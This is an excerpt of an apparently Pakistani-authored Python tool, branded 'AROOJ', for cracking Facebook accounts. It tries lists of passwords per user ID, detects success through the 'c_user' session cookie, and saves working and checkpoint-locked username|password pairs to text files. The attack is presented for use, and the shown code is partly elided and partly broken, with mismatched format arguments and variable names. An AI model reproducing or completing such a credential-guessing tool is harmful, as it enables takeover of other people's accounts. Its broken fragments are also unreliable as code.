...
logo =                                          """   
\033[1;92m_______  _______  _______  _______ _________
\033[1;93m(  ___  )(  ____ )(  ___  )(  ___  )\__    _/
\033[1;93m| (   ) || (    )|| (   ) || (   ) |   )  (  
\033[1;94m| (___) || (____)|| |   | || |   | |   |  |  
\033[1;95m|  ___  ||     __)| |   | || |   | |   |  |  
\033[1;96m| (   ) || (\ (   | |   | || |   | |   |  |  
\033[1;97m| )   ( || ) \ \__| (___) || (___) ||\_)  )  
\033[1;99m|/     \||/   \__/(_______)(_______)(____/                      \033[1;37m============================================
\033[1;31m\033[1;37m Author \x1b[1;97m   : \033[1;37m     AROOJ
\033[1;31m\033[1;37m Facebook\x1b[1;97m  :  \033[1;37m   AROOJ 
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAROOJ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAROOJ_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Arooj Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AROOJ] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AROOJ-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AROOJ_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [AROOJ-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('AROOJ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
